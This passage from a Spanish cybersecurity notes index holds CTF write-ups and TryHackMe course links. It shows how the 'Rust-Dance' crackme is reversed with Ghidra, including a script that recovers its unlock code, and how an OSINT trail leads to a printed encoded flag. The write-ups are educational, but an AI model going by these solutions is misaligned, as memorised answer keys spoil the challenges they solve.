flag.\n    ![[Pasted image 20260210194617.png]]\n\n>[!SUCCESS] Reto de API superado, ¬°phew! Este fue m√°s complicadillo, ¬øeh?",
    "modified": "2026-02-11T01:16:12"
  },
  {
    "title": "0. Web",
    "path": "/apuntes/ctfs/1-talent-arena/2026/2-web/0-web/",
    "src": "content/Ciberseguridad/CTFs/1. Talent Arena/2026/2. Web/0. Web.md",
    "breadcrumb": "CTFs > 1. Talent Arena > 2026 > 2. Web",
    "content": "[[Ciberseguridad/CTFs/1. Talent Arena/2026/2. Web/1. Introduction]]\n[[2. Companion API]]",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/ctfs/1-talent-arena/2026/3-reverse-engineering/1-introduction/",
    "src": "content/Ciberseguridad/CTFs/1. Talent Arena/2026/3. Reverse Engineering/1. Introduction.md",
    "breadcrumb": "CTFs > 1. Talent Arena > 2026 > 3. Reverse Engineering",
    "content": "<h2>Rust-Dance: The Virus That Dances</h2>\n\n<h3>The Story</h3>\nA new threat has emerged from the depths of the network. They call it **Rust-Dance** - a virus that doesn't just infect systems, it makes them _dance_.\n\nEvery file, every process, every byte... now moves to its rhythm.\n\nYour mission: Find the unlock code that stops the dance. Reverse engineer the virus, understand its choreography, and break free.\n\nThe flag is definitely not \"unlockcode123456789\", so don't even try.\n\nThe clock is ticking. The dance continues...\n\n----------------------\n<h3>How to Run</h3>\n\n<h4>Requirements</h4>\n\nYou may use one of the following:\n\n- Windows Subsystem for Linux (WSL)\n- Linux x86_64 system (native or VM)\n\n<h4>Execution</h4>\n\n```bash\n# Make the binary executable (if needed)\nchmod +x rust-dance\n\n# Run the challenge\n./rust-dance\n\n# The virus will prompt you for the unlock code\n# Your goal: find the correct code to reveal the flag\n```\n\n<h3>Rules</h3>\n\n1. The flag format is: `MWC{...}`\n2. You must find the unlock code through reverse engineering\n3. Standard reversing tools are allowed (IDA, Ghidra, radare2, GDB, etc.)\n4. Have fun and learn!\n\n<h3>Flag Submission</h3>\n\nOnce you find the flag, submit it on the CTF platform in the format:\n\n```\nMWC{hash}\n```\n\n------------------------------\n\nGood luck, reverser. Stop the dance.\n\n---------------------------------------------------------<h2>Rust-Dance: El Virus Que Baila</h2>\n\n<h3>La Historia</h3>\n\nUna nueva amenaza ha surgido de las profundidades de la red. Lo llaman **Rust-Dance**: un virus que no solo infecta sistemas, sino que los hace bailar.\n\nCada archivo, cada proceso, cada byte... ahora se mueve a su ritmo.\n\nTu misi√≥n: encontrar el c√≥digo de desbloqueo que detiene el baile. Aplica ingenier√≠a inversa al virus, comprende su coreograf√≠a y lib√©rate.\n\nEl indicador definitivamente no es \"unlockcode123456789\", as√≠ que ni lo intentes.\n\nEl tiempo avanza. El baile contin√∫a...\n\n-------------\n<h3>C√≥mo ejecutar</h3>\n\n<h4>Requisitos</h4>\n\nPuedes usar uno de los siguientes:\n\n- Subsistema de Windows para Linux (WSL)\n- Sistema Linux x86_64 (nativo o VM)\n\n<h4>Ejecuci√≥n</h4>\n\n```bash\n# Crea el binario ejecutable (si es necesario)\nchmod +x rust-dance\n\n# Ejecuta el desaf√≠o\n./rust-dance\n\n# El virus te pedir√° el c√≥digo de desbloqueo\n# Tu objetivo: encontrar el c√≥digo correcto para revelar la bandera\n```\n\n<h3>Reglas</h3>\n\n1. El formato de la bandera es: `MWC{...}`\n2. Debes encontrar el c√≥digo de desbloqueo mediante ingenier√≠a inversa\n3. Se permiten herramientas de reversi√≥n est√°ndar (IDA, Ghidra, radare2, GDB, etc.)\n4. ¬°Divi√©rtete y aprende!\n\nEnv√≠o de la bandera\n\nUna vez que encuentres la bandera, env√≠ala a la plataforma CTF con el siguiente formato:\n\n```\nMWC{hash}\n```\n\n---\n\n¬°Buena suerte, reversor! ¬°Para el bailar!",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "2. The Rust Dance",
    "path": "/apuntes/ctfs/1-talent-arena/2026/3-reverse-engineering/2-the-rust-dance/",
    "src": "content/Ciberseguridad/CTFs/1. Talent Arena/2026/3. Reverse Engineering/2. The Rust Dance.md",
    "breadcrumb": "CTFs > 1. Talent Arena > 2026 > 3. Reverse Engineering",
    "content": "1. Empezamos comprobando el tipo de archivo que tenemos en frente.\n   ![[Pasted image 20260210201613.png]]\n2. Ahora vamos a ejecutar el c√≥digo una vez para ver su comportamiento.\n   ![[Pasted image 20260210201659.png]]\n   Parece que debemos de introducir el c√≥digo correcto para que el programa nos devuelva la flag.\n3. Vamos a hacer una serie de comprobaciones para ver qu√© strings hay dentro del c√≥digo.\n\t1. Empezamos investigando las strings con `strings ./rust-dance`.\n\t   ![[Pasted image 20260210202014.png]]\n\t   Pero hay demasiadas.\n\t   ![[Pasted image 20260210202041.png]]\n\t2. As√≠ que seremos un poco m√°s selectivos.\n\t   ![[Pasted image 20260210202235.png]]\n\t   Aqu√≠ vemos algunas coincidencias, pero (aunque hay m√°s) no vemos nada muy interesante.\n\t3. Vamos a observar trazas din√°micas, para ello usamos `strace` y filtramos despu√©s.\n\t   ![[Pasted image 20260210202548.png]]\n\t   ![[Pasted image 20260210202734.png]]\n\t   Como `strace` no revela comparaciones en `libc`, el siguiente paso es usar `ltrace` para ver si `memcmp/strcmp/bcmp` existen. Sin embargo, nos ayuda a conocer el punto en el que introducir un `breakpoint` m√°s adelante.\n\t4. Usamos `ltrace`.\n\t   ![[Pasted image 20260210203610.png]]\n\t   Parece que no hay ninguna llamada t√≠pica por lo que parece que NO hay una comprobaci√≥n directa entre dos strings. Lo m√°s probable es que la validaci√≥n la haga en el c√≥digo propio sin acceder a m√°s valores de memoria.\n4. Vamos a descompilar el binario con `ghidra`.\n\t1. Abrimos el archivo en `ghidra` y lo analizamos.\n\t   ![[Pasted image 20260211191947.png]]\n\t2. Buscamos la string de `Unlock code`.\n\t   ![[Pasted image 20260211192435.png]]\n\t   ![[Pasted image 20260211192449.png]]\n\t   Esto nos lleva a la funci√≥n que lo imprime.\n\t3. Si hacemos doble click sobre la referencia de funci√≥n que lo imprime:\n\t   ![[Pasted image 20260211192604.png]]\n\t   Nos lleva aqu√≠:\n\t   ![[Pasted image 20260211192646.png]]\n\t   Donde hay otras dos referencias:\n\t   ![[Pasted image 20260211192720.png]]\n\t   Hacemos doble click en la primera\n\t4. Se nos cargar√° la funci√≥n en el Decompile (a la derecha) y despu√©s de buscar un rato encontramos el bucle que realiza operaciones contra nuestro string. Primero se valida si el input tiene 19 (`0x13`) caracteres exactamente. Si es as√≠ comienza las transformaciones.\n\t   ![[Pasted image 20260211202813.png]]\n\t   ![[Pasted image 20260211202838.png]]\n5. Son m√°s de 700 lineas de operaciones, vueltas y comprobaciones, es demasiado para un humano con poco tiempo, por lo que se lo pasaremos a nuestro mejor amigo: `ChatGPT`.\n6. Le pasamos todo el contenido de `.rodata` a ChatGPT.\n   ![[Pasted image 20260211204023.png]]\n7. Con el contenido de `.rodata` y el bucle de comprobaci√≥n, la IA nos devuelve un c√≥digo que al ejecutar puede obtener el \"Unlock code\".\n\n```python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# -------------------------\n# Helpers (rotaciones)\n# -------------------------\ndef rol8(x, r):\n    r &= 7\n    return ((x << r) | (x >> (8 - r))) & 0xFF\n\ndef ror8(x, r):\n    r &= 7\n    return ((x >> r) | (x << (8 - r))) & 0xFF\n\ndef rol4(x):\n    # swap nibbles (su propio inverso)\n    return ((x << 4) | (x >> 4)) & 0xFF\n\n# -------------------------\n# Constantes (sacadas de .rodata, seg√∫n tu dump)\n# -------------------------\nKEY_00103CF0 = [\n    0x87, 0x9e, 0xb5, 0xcc, 0xe3, 0xfa, 0x11, 0x28,\n    0x3f, 0x56, 0x6d, 0x84, 0x9b, 0xb2, 0xc9, 0xe0\n]\n\nADD_00103D10 = [\n    0x33, 0xCC, 0x35, 0xCA, 0x37, 0xC8, 0x39, 0xC6,\n    0x3B, 0xC4, 0x3D, 0xC2, 0x3F, 0xC0, 0x41, 0xBE\n]\n\n# DWords objetivo tras el nibble-swap (porque el OR da 0 => cada XOR debe ser 0)\n# buf[0:4]  == 0x4694ac0e\n# buf[4:8]  == 0x72be6fc6\n# buf[8:12] == 0xee795db7\n# buf[12:16]== 0xa2edd0e2\nTARGET16_AFTER_NIBBLE = [\n    0x0e, 0xac, 0x94, 0x46,\n    0xc6, 0x6f, 0xbe, 0x72,\n    0xb7, 0x5d, 0x79, 0xee,\n    0xe2, 0xd0, 0xed, 0xa2\n]\n\n# Bytes finales tras rol4 (lo que compara el if)\nPOST16_18_ROL4 = [0xC6, 0x28, 0x8A]\n\n# -------------------------\n# Shift exacto del bucle (seg√∫n el ensamblado)\n# -------------------------\ndef shift_even(i, c):\n    # ECX = floor(i/7)\n    q7 = i // 7\n    # EDX = ((((i - q7) >> 1) + q7) >> 2)\n    edx = (((i - q7) >> 1) + q7) >> 2\n    # R9D = edx*7\n    r9 = edx * 7\n    # CL = c - r9  (y luego rotate)\n    return (c - r9) & 7\n\ndef shift_odd(i, c):\n    # en ensamblado: (floor(i/5) * 5) y luego c - eso\n    q5 = i // 5\n    edx = q5 * 5\n    return (c - edx) & 7\n\ndef invert_rotation(buf19_after):\n    \"\"\"\n    Invierte el bucle que rota 19 bytes (i=0..18, c=1..19).\n    \"\"\"\n    b = buf19_after[:]\n    for i in range(18, -1, -1):\n        c = i + 1\n        sh = shift_even(i, c) if (i & 1) == 0 else shift_odd(i, c)\n        if (i & 1) == 0:\n            # forward: ROL -> inverse: ROR\n            b[i] = ror8(b[i], sh)\n        else:\n            # forward: ROR -> inverse: ROL\n            b[i] = rol8(b[i], sh)\n    return b\n\n# -------------------------\n# Inversi√≥n total\n# -------------------------\ndef recover_unlock():\n    # (1) Invertir nibble-swap de los 16 primeros bytes\n    after_padd = [rol4(x) for x in TARGET16_AFTER_NIBBLE]\n\n    # (2) Invertir PADDB (restar vector ADD_00103D10)\n    after_rotate_0_15 = [(b - k) & 0xFF for b, k in zip(after_padd, ADD_00103D10)]\n\n    # (3) Invertir bytes 16..18:\n    #     forward: b += [0x43,0xBC,0x45] ; rol4(b)\n    #     inverse: ror4(b) ; b -= [0x43,0xBC,0x45]\n    pre_add = [rol4(x) for x in POST16_18_ROL4]  # inverse rol4 == rol4\n    b16 = (pre_add[0] - 0x43) & 0xFF\n    b17 = (pre_add[1] - 0xBC) & 0xFF\n    b18 = (pre_add[2] - 0x45) & 0xFF\n\n    buf_after_rotation = after_rotate_0_15 + [b16, b17, b18]\n\n    # (4) Invertir el bucle de rotaciones para obtener el buffer justo despu√©s del shuffle inicial\n    buf_pre_loop = invert_rotation(buf_after_rotation)\n\n    # (5) Invertir el ‚Äúshuffle SSE‚Äù:\n    #     En ensamblado realmente es: out[0..15] = reverse( (in[3..18] ^ KEY) )\n    out0_15 = buf_pre_loop[:16]\n    in_3_18_xored = list(reversed(out0_15))\n    in_3_18 = [b ^ k for b, k in zip(in_3_18_xored, KEY_00103CF0)]\n\n    # (6) Recuperar in[0..2] desde buf[16..18]:\n    #     buf[16] = in[2]^0x70, buf[17] = in[1]^0x59, buf[18]=in[0]^0x42\n    in2 = buf_pre_loop[16] ^ 0x70\n    in1 = buf_pre_loop[17] ^ 0x59\n    in0 = buf_pre_loop[18] ^ 0x42\n\n    unlock = bytes([in0, in1, in2] + in_3_18)\n    return unlock\n\nif __name__ == \"__main__\":\n    code = recover_unlock()\n    print(code.decode(\"latin1\"))\n\n```\n\n8. Si ahora ejecutamos dicho c√≥digo:\n   ![[Pasted image 20260211204250.png]]\n9. Introducimos dicho c√≥digo en el programa.\n   ![[Pasted image 20260211204330.png]]",
    "modified": "2026-02-12T01:08:37"
  },
  {
    "title": "0. Reverse Engineering",
    "path": "/apuntes/ctfs/1-talent-arena/2026/3-reverse-engineering/0-reverse-engineering/",
    "src": "content/Ciberseguridad/CTFs/1. Talent Arena/2026/3. Reverse Engineering/0. Reverse Engineering.md",
    "breadcrumb": "CTFs > 1. Talent Arena > 2026 > 3. Reverse Engineering",
    "content": "[[Ciberseguridad/CTFs/1. Talent Arena/2026/3. Reverse Engineering/1. Introduction]]\n[[2. The Rust Dance]]",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/ctfs/1-talent-arena/2026/1-osint/1-introduction/",
    "src": "content/Ciberseguridad/CTFs/1. Talent Arena/2026/1. OSINT/1. Introduction.md",
    "breadcrumb": "CTFs > 1. Talent Arena > 2026 > 1. OSINT",
    "content": "<h2>üîç The Digital Treasure Hunt</h2>\nA developer known as **DevZero-99** has hidden a secret message somewhere on the internet for those clever enough to find it.\n\nYour mission: **Follow his digital trail and uncover the hidden flag.**\n\n---\n<h2>üö© Flag Format</h2>\n\n`MWC{...}`\n\nGood luck, explorer! üïµÔ∏è\n\n-------------------------------------------\n<h2>üîç La Caza Digital del Tesoro</h2>\nUn desarrollador conocido como **DevZero-99** ha escondido un mensaje secreto en alguna parte de internet para aquellos lo suficientemente inteligentes para encontrarlo.\n\nTu misi√≥n: **Seguir su rastro digital para revelar la bandera oculta.**\n\n---\n<h2>üö© Formato de la Bandera</h2>\n\n`MWC{...}`\n\nBuena suerte, explorador! üïµÔ∏è",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "0. OSINT",
    "path": "/apuntes/ctfs/1-talent-arena/2026/1-osint/0-osint/",
    "src": "content/Ciberseguridad/CTFs/1. Talent Arena/2026/1. OSINT/0. OSINT.md",
    "breadcrumb": "CTFs > 1. Talent Arena > 2026 > 1. OSINT",
    "content": "[[Ciberseguridad/CTFs/1. Talent Arena/2026/1. OSINT/1. Introduction]]\n[[2. The Digital Treasure Hunt]]",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "2. The Digital Treasure Hunt",
    "path": "/apuntes/ctfs/1-talent-arena/2026/1-osint/2-the-digital-treasure-hunt/",
    "src": "content/Ciberseguridad/CTFs/1. Talent Arena/2026/1. OSINT/2. The Digital Treasure Hunt.md",
    "breadcrumb": "CTFs > 1. Talent Arena > 2026 > 1. OSINT",
    "content": "1. Como nos dicen que es un desarrollador, empezaremos buscando su nombre en la plataforma de programadores/desarrolladores y c√≥digo m√°s famosa del mundo: GitHub.\n   ![[Pasted image 20260210174727.png]]\n   Efectivamente encontramos un usuario.\n2. Si nos metemos en su perfil veremos que s√≥lo tiene un repositorio, por lo que nos meteremos en dicho repositorio.\n   ![[Pasted image 20260210174823.png]]\n3. Vemos un TODO en el que supuestamente ha borrado informaci√≥n sensible, pero nosotros sabemos que no por borrar una parte de c√≥digo en GitHub se elimina, as√≠ que vamos a los commits del repo.\n   ![[Pasted image 20260210174955.png]]\n   Efectivamente vemos que el `.gitignore` no se cre√≥ hasta antes de modificar el √∫ltimo commit.\n4. Visto esto decidimos entrar en el commit \"Create utils.js\".\n   ![[Pasted image 20260210175122.png]]\n   En dicho commit nos encontramos un ID: `qcSWnAj0`. Adem√°s hay un gui√±o a la plataforma `pastebin`: \"a more... pasteable place\".\n5. Si vamos a `pastebin.com/ID`, que nos hab√≠amos encontrado, encontramos una nota privada del usuario `DEVZERO-99`.\n   ![[Pasted image 20260210175421.png]]\n   En dicho documento se explica una migraci√≥n de un proyecto \"secreto\" (no tanto compa√±ero ;) ). Adem√°s podemos ver una wallet y el nombre de la testnet usada.\n6. Si vamos a la testnet usada e introducimos el id de la wallet:\n   ![[Pasted image 20260210175631.png]]\n   Podemos ver que ha habido un par de transacciones y una creaci√≥n de contrato que parece que puede contener informaci√≥n.\n7. Vamos a darle al `Tansaction Hash` de este contrato.\n   ![[Pasted image 20260210180449.png]]\n8. Una vez all√≠ le damos a `+ Click to show more`.\n   ![[Pasted image 20260210180522.png]]\n9. All√≠ le damos a `View Input As` y seleccionamos `UTF-8`.\n   ![[Pasted image 20260210180603.png]]\n   Aparece un mensaje \"Some secrets are hidden in plain sight. The journey is the reward.\" (\"Algunos secretos est√°n ocultos a simple vista. El viaje es la recompensa.\"). Seguido de una cadena que parece base64: `TVdDe2Qzdl96M3IwX24zdjNyX2QxM3NfMG5fY2g0MW59`.\n10. Convertimos la cadena ASCII.\n    ![[Pasted image 20260210180933.png]]\n\n>[!SUCCESS] ¬°¬°Reto resuelto!!",
    "modified": "2026-02-11T01:16:12"
  },
  {
    "title": "0. Pre Career",
    "path": "/apuntes/thm/0-pre-career/0-pre-career/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/0. Pre Career.md",
    "breadcrumb": "THM > 0. Pre Career",
    "content": "[[1. Pre Security]]\n[[2. Cyber Security 101]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Career",
    "path": "/apuntes/thm/1-career/1-career/",
    "src": "content/Ciberseguridad/THM/1. Career/1. Career.md",
    "breadcrumb": "THM > 1. Career",
    "content": "[[1. Security Analyst]]\n[[2. Penetration Tester]]\n[[3. Security Engineer]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Advent of Cyber",
    "path": "/apuntes/thm/advent-of-cyber/0-advent-of-cyber/",
    "src": "content/Ciberseguridad/THM/Advent of Cyber/0. Advent of Cyber.md",
    "breadcrumb": "THM > Advent of Cyber",
    "content": "1. [[2025]]\n2.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Maquinas",
    "path": "/apuntes/thm/maquinas/0-maquinas/",
    "src": "content/Ciberseguridad/THM/Maquinas/0. Maquinas.md",
    "breadcrumb": "THM > Maquinas",
    "content": "- [[1. Easy]]\n- [[2. Medium]]\n- [[3. Hard]]\n- [[4. Insane]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Cyber Security 101",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-cyber-security-101/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Cyber Security 101.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101",
    "content": "[[1. Start Your Cyber Security Journey]]\n[[2. Linux Fundamentals]]\n[[3. Windows and AD Fundamentals]]\n[[4. Command Line]]\n[[5. Networking]]\n[[6. Cryptography]]\n[[7. Exploitation Basics]]\n[[8. Web Hacking]]\n[[9. Offensive Security Tooling]]\n[[10. Defensive Security]]\n[[11. Security Solutions]]\n[[12. Defensive Security Tooling]]\n[[13. Build Your Cyber Security Career]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Pre Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-pre-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Pre Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security",
    "content": "[[1. Introduction to cybersecurity]]\n[[2. Network Fundamentals]]\n[[3. How the Web Works]]\n[[4. Linux Fundamentals]]\n[[5. Windows Fundamentals]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Linux Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/2-linux-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/2. Linux Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals",
    "content": "[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/1. Linux Fundamentals 1/0. Linux Fundamentals 1]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/2. Linux Fundamentals 2/0. Linux Fundamentals 2]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/3. Linux Fundamentals 3/0. Linux Fundamentals 3]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Start Your Cyber Security Journey",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/1-start-your-cyber-security-journey/1-start-your-cyber-security-journey/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/1. Start Your Cyber Security Journey.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 1. Start Your Cyber Security Journey",
    "content": "1. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/1. Offensive Security Intro/0. Offensive Security Intro]]\n2. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/1. Start Your Cyber Security Journey/2. Defensive Security Intro/0. Defensive Security Intro]]\n3. [[0. Search Skills]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Cryptography",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/6-cryptography/6-cryptography/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/6. Cryptography/6. Cryptography.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 6. Cryptography",
    "content": "1. [[0. Cryptography Basics]]\n2. [[0. Public Key Cryptography Basics]]\n3. [[0. Hashing Basics]]\n4. [[0. John the Ripper - The Basics]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Offensive Security Tooling",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/9-offensive-security-tooling/9-offensive-security-tooling/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/9. Offensive Security Tooling/9. Offensive Security Tooling.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 9. Offensive Security Tooling",
    "content": "1. [[0. Hydra]]\n2. [[0. Gobuster - The Basics]]\n3. [[0. Shells Overview]]\n4. [[0. SQLMap - The Basics]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Networking",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/5-networking/5-networking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/5. Networking/5. Networking.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 5. Networking",
    "content": "1. [[0. Networking Concepts]]\n2. [[0. Networking Essentials]]\n3. [[0. Networking Core Protocols]]\n4. [[0. Networking Secure Protocols]]\n5. [[0. Whireshark - The Basics]]\n6. [[0. Tcpdump - The Basics]]\n7. [[0. Nmap - The Basics]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Command Line",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/4-command-line/4-command-line/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/4. Command Line/4. Command Line.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 4. Command Line",
    "content": "[[0. Windows Command Line]]\n[[0. Windows PowerShell]]\n[[0. Linux Shells]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Windows and AD Fundamentals",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/3-windows-and-ad-fundamentals/3-windows-and-ad-fundamentals/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/3. Windows and AD Fundamentals.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 3. Windows and AD Fundamentals",
    "content": "1. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/1. Windows Fundamentals 1/0. Windows Fundamentals 1]]\n2. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/2. Windows Fundamentals 2/0. Windows Fundamentals 2]]\n3. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/3. Windows and AD Fundamentals/3. Windows Fundamentals 3/0. Windows Fundamentals 3]]\n4. [[0. Active Directory Basics]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. Web Hacking",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/8-web-hacking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/8. Web Hacking.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 8. Web Hacking",
    "content": "1. [[0. Web Application Basics]]\n2. [[0. JavaScript Essentials]]\n3. [[0. SQL Fundamentals]]\n4. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/4. Burp Suite - The Basics/0. Burp Suite - The Basics]]\n5. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "10. Defensive Security",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/10-defensive-security/10-defensive-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/10. Defensive Security.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 10. Defensive Security",
    "content": "1. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/10. Defensive Security/1. Defensive Security Intro/0. Defensive Security Intro]]\n2. [[0. SOC Fundamentals]]\n3. [[0. Digital Forensics Fundamentals]]\n4. [[0. Incident Response Fundamentals]]\n5. [[0. Logs Fundamentals]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "13. Build Your Cyber Security Career",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/13-build-your-cyber-security-career/13-build-your-cyber-security-career/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/13. Build Your Cyber Security Career.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 13. Build Your Cyber Security Career",
    "content": "1. [[0. Security Principles]]\n2. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/13. Build Your Cyber Security Career/2. Careers in Cyber/0. Careers in Cyber]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Exploitation Basics",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/7-exploitation-basics/7-exploitation-basics/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/7. Exploitation Basics.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 7. Exploitation Basics",
    "content": "1. [[0. Moniker Link (CVE-2024-21413)]]\n2. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/2. Metasploit - Introduction/0. Metasploit - Introduction]]\n3. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/3. Metasploit - Exploitation/0. Metasploit - Exploitation]]\n4. [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/7. Exploitation Basics/4. Metasploit - Meterpreter/0. Metasploit - Meterpreter]]\n5. [[0. Blue]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "11. Security Solutions",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/11-security-solutions/11-security-solutions/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/11. Security Solutions/11. Security Solutions.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 11. Security Solutions",
    "content": "1. [[0. Introduction to SIEM]]\n2. [[0. Firewall Fundamentals]]\n3. [[0. IDS Fundamentals]]\n4. [[0. Vulnerability Scanner Overview]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "12. Defensive Security Tooling",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/12-defensive-security-tooling/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/12. Defensive Security Tooling.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling",
    "content": "1. [[0. CyberChef - The Basics]]\n2. [[0. CAPA - The Basics]]\n3. [[0. REMnux - Getting Started]]\n4. [[0. FlareVM - Arsenal of Tools]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/2-linux-fundamentals-2/1-redireccion/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/2. Linux Fundamentals 2/1. Redireccion.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals > 2. Linux Fundamentals 2",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 4. Linux Fundamentals -> Linux Fundamentals Part 2**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Linux Fundamentals 2",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/2-linux-fundamentals-2/0-linux-fundamentals-2/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/2. Linux Fundamentals 2/0. Linux Fundamentals 2.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 2. Linux Fundamentals > 2. Linux Fundamentals 2",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/0. Linux Fundamentals 2]]\n[[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/2. Linux Fundamentals/2. Linux Fundamentals 2/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/2-linux-fundamentals/1-linux-fundamentals-1/1-redireccion/",
